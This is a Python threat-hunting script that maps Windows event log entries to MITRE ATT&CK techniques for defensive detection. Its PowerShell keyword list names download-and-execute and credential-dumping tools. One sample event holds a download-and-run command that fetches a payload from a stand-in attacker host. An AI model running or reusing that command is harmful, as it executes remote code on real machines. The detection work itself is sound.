#!/usr/bin/env python3
"""
Threat Hunt — Windows Event Log Analyzer
=========================================
Maps Windows Security Event Log entries to MITRE ATT&CK techniques.

Detects:
  - Pass-the-Hash / Pass-the-Ticket (Event 4624, logon type 3/9)
  - Account enumeration (Event 4625 bursts)
  - New local admin created (Event 4720 + 4732)
  - Scheduled task creation (Event 4698)
  - PowerShell script block logging (Event 4104)
  - Service installation (Event 7045)
  - LSASS access (Event 10 — Sysmon)

Author : Matthew Vaishnav
Usage  : python threat_hunt.py --demo
"""

import json
import argparse
from datetime import datetime
from collections import defaultdict
from pathlib import Path

MITRE_MAP = {
    "Pass-the-Hash":        "T1550.002",
    "Brute Force":          "T1110.001",
    "Account Creation":     "T1136.001",
    "Scheduled Task":       "T1053.005",
    "PowerShell Execution": "T1059.001",
    "Service Installation": "T1543.003",
    "Credential Dumping":   "T1003.001",
    "Lateral Movement":     "T1021.002",
}

SEVERITY_COLOR = {
    "CRITICAL": "🔴",
    "HIGH":     "🟠",
    "MEDIUM":   "🟡",
    "LOW":      "🔵",
    "INFO":     "⚪",
}


class ThreatHunter:
    def __init__(self):
        self.findings = []
        self._failure_tracker: dict[str, list] = defaultdict(list)
        self._admin_events: dict[str, list] = defaultdict(list)

    def _finding(self, severity, technique, mitre_id, account, host, detail, raw_event):
        f = {
            "severity": severity,
            "technique": technique,
            "mitre_id": mitre_id,
            "mitre_url": f"https://attack.mitre.org/techniques/{mitre_id.replace('.', '/')}/",
            "account": account,
            "host": host,
            "detail": detail,
            "raw": raw_event,
            "hunt_time": datetime.utcnow().isoformat() + "Z",
        }
        self.findings.append(f)
        icon = SEVERITY_COLOR.get(severity, "⚪")
        print(f"  {icon} [{severity}] {technique} ({mitre_id})")
        print(f"      Host: {host} | Account: {account}")
        print(f"      {detail}\n")

    def analyze_event(self, event: dict):
        eid = int(event.get("EventID", 0))
        account = event.get("TargetUserName", event.get("SubjectUserName", "UNKNOWN"))
        host = event.get("Computer", "UNKNOWN")
        logon_type = int(event.get("LogonType", 0))

        if eid == 4624:
            if logon_type in (3, 9) and event.get("AuthenticationPackageName") == "NTLM":
                if not account.endswith("$"):
                    self._finding(
                        "HIGH", "Pass-the-Hash", MITRE_MAP["Pass-the-Hash"],
                        account, host,
                        f"NTLM network logon (type {logon_type}) — possible PtH. "
                        f"Workstation: {event.get('WorkstationName', 'N/A')}",
                        event,
                    )

        elif eid == 4625:
            key = f"{host}:{account}"
            self._failure_tracker[key].append(event)
            if len(self._failure_tracker[key]) >= 5:
                self._finding(
                    "HIGH", "Brute Force", MITRE_MAP["Brute Force"],
                    account, host,
                    f"{len(self._failure_tracker[key])} failed logons detected",
                    event,
                )
                self._failure_tracker[key] = []

        elif eid == 4720:
            new_user = event.get("TargetUserName", "UNKNOWN")
            self._finding(
                "MEDIUM", "Account Creation", MITRE_MAP["Account Creation"],
                account, host,
                f"New account created: '{new_user}' by '{account}'",
                event,
            )

        elif eid == 4732:
            group = event.get("TargetUserName", "UNKNOWN")
            member = event.get("MemberName", "UNKNOWN")
            if "admin" in group.lower() or "administrator" in group.lower():
                self._finding(
                    "HIGH", "Account Creation", MITRE_MAP["Account Creation"],
                    account, host,
                    f"Account '{member}' added to privileged group '{group}'",
                    event,
                )

        elif eid == 4698:
            task_name = event.get("TaskName", "UNKNOWN")
            self._finding(
                "HIGH", "Scheduled Task", MITRE_MAP["Scheduled Task"],
                account, host,
                f"Scheduled task created: '{task_name}'.",
                event,
            )

        elif eid == 4104:
            script = event.get("ScriptBlockText", "").lower()
            iocs = []
            for kw in [
                "invoke-expression", "downloadstring", "base64", "bypass",
                "-enc", "iex(", "invoke-mimikatz", "invoke-reflectivepeinjection",
            ]:
                if kw in script:
                    iocs.append(kw)
            if iocs:
                self._finding(
                    "CRITICAL", "PowerShell Execution", MITRE_MAP["PowerShell Execution"],
                    account, host,
                    f"Suspicious script block. IOCs found: {', '.join(iocs)}",
                    event,
                )

        elif eid == 7045:
            service = event.get("ServiceName", "UNKNOWN")
            binary = event.get("ImagePath", "UNKNOWN")
            self._finding(
                "HIGH", "Service Installation", MITRE_MAP["Service Installation"],
                account, host,
                f"Service '{service}' installed. Binary: {binary}",
                event,
            )

        elif eid == 10:
            target = event.get("TargetImage", "")
            if "lsass.exe" in target.lower():
                caller = event.get("SourceImage", "UNKNOWN")
                self._finding(
                    "CRITICAL", "Credential Dumping", MITRE_MAP["Credential Dumping"],
                    account, host,
                    f"LSASS process accessed by: {caller}. Possible credential theft.",
                    event,
                )

    def report(self) -> dict:
        by_technique = defaultdict(int)
        by_severity = defaultdict(int)
        for f in self.findings:
            by_technique[f["technique"]] += 1
            by_severity[f["severity"]] += 1
        return {
            "hunt_summary": {
                "total_findings": len(self.findings),
                "by_severity": dict(by_severity),
                "by_technique": dict(by_technique),
            },
            "findings": self.findings,
        }


DEMO_EVENTS = [
    {
        "EventID": 4624,
        "Computer": "WORKSTATION-07",
        "TargetUserName": "jsmith",
        "LogonType": 3,
        "AuthenticationPackageName": "NTLM",
        "WorkstationName": "UNKNOWN-HOST",
    },
    {"EventID": 4625, "Computer": "DC01", "TargetUserName": "administrator", "LogonType": 3},
    {"EventID": 4625, "Computer": "DC01", "TargetUserName": "administrator", "LogonType": 3},
    {"EventID": 4625, "Computer": "DC01", "TargetUserName": "administrator", "LogonType": 3},
    {"EventID": 4625, "Computer": "DC01", "TargetUserName": "administrator", "LogonType": 3},
    {"EventID": 4625, "Computer": "DC01", "TargetUserName": "administrator", "LogonType": 3},
    {
        "EventID": 4720,
        "Computer": "DC01",
        "SubjectUserName": "svc-backup",
        "TargetUserName": "backdoor_user",
    },
    {
        "EventID": 4104,
        "Computer": "WORKSTATION-07",
        "SubjectUserName": "jsmith",
        "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
    },
    {
        "EventID": 10,
        "Computer": "WORKSTATION-07",
        "SubjectUserName": "SYSTEM",
        "TargetImage": "C:\\Windows\\system32\\lsass.exe",
        "SourceImage": "C:\\Users\\jsmith\\AppData\\Temp\\svch0st.exe",
    },
]


def main():
    parser = argparse.ArgumentParser(description="Threat Hunter — Windows Event Log Analyzer")
    parser.add_argument("--input", help="Path to JSON events file")
    parser.add_argument("--output", default="hunt_report.json")
    parser.add_argument("--demo", action="store_true")
    args = parser.parse_args()

    hunter = ThreatHunter()

    if args.demo or not args.input:
        print("\n🎯 THREAT HUNT — Demo Mode\n" + "═" * 50 + "\n")
        for event in DEMO_EVENTS:
            hunter.analyze_event(event)
    else:
        path = Path(args.input)
        print(f"\n🎯 THREAT HUNT — {path.name}\n" + "═" * 50 + "\n")
        events = json.loads(path.read_text())
        if isinstance(events, list):
            for event in events:
                hunter.analyze_event(event)
        else:
            hunter.analyze_event(events)

    report = hunter.report()
    Path(args.output).write_text(json.dumps(report, indent=2, default=str))

    s = report["hunt_summary"]
    print("═" * 50)
    print(f"  Total Findings : {s['total_findings']}")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        count = s["by_severity"].get(sev, 0)
        if count:
            print(f"  {SEVERITY_COLOR[sev]} {sev:10} : {count}")
    print(f"  💾 Report saved : {args.output}")
    print("═" * 50 + "\n")


if __name__ == "__main__":
    main()
